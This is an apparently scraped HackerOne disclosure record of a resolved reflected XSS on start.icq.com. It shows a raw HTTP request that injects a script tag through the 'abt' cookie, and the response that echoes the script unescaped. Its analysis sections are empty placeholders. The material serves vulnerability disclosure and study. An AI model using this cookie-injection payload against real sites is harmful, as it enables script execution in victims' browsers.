---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '83576'
original_report_id: '83576'
title: '[start.icq.com] Reflected XSS via Cookies'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2015-08-20T03:29:00.357Z'
disclosed_at: '2015-10-21T11:27:49.481Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [start.icq.com] Reflected XSS via Cookies

## Metadata

- HackerOne Report ID: 83576
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2015-10-21T11:27:49.481Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Request:

GET / HTTP/1.1
Cookie: geo=380; icqsrch_lang=ua; abt=1"><script>alert(document.domain)</script><a href="; icq_pref=medium%3A_blank
Referer: http://start.icq.com/
Host: start.icq.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

Response:

<div class="d3-1-3" id="icq_ads" onmouseover="showIcqAd('block')" onmouseout="showIcqAd('none')">
			<a href="//www.icq.com/download/mobile/ua?sp=1"><script>alert(document.domain)</script><a href="" target="_blank" onclick="call_ga_event('icq_ads', 'ver_1')">
				<img src="//search.icq.com/search/img/new/mobile.jpg" border="0"/>
			</a>
			<div class="d3-1-3-1">
				<div class="d3-1-3-1-1">
					<a href="//www.icq.com/download/mobile/ua?sp=1"><script>alert(document.domain)</script><a href="" target="_blank" onclick="call_ga_event('icq_ads', 'ver_1')" style="text-decoration:none; color:#000000;">
						ICQ Mobile

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
